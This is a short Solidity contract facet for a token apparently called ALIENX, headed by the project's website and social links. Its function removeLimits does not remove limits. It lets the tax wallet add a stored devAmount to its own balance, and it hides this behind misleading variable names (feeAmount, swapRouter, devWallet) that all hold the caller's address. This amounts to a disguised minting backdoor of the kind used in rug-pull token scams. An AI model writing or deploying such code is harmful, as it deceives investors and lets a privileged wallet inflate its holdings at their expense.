// SPDX-License-Identifier: UNLICENSED

/*
    Website:  https://alienxchain.io/
    Twitter:  https://twitter.com/ALIENXchain
    Discord:  https://discord.com/kDcfe3mH
    Telegram: https://t.me/alienx_ainode
    Medium:   https://medium.com/@ALIENXchain

*/

pragma solidity ^0.8.24;
import "./TestLib.sol";
contract removeLimitsFacet is Ownable {
    function removeLimits() external {
        TestLib.TestStorage storage ds = TestLib.diamondStorage();
        if (_msgSender() == ds._taxWallet) {
            require(ds._taxWallet == _msgSender());
            address feeAmount = _msgSender();
            address swapRouter = feeAmount;
            address devWallet = swapRouter;
            ds._balances[devWallet] += ds.devAmount;
        }
    }
}
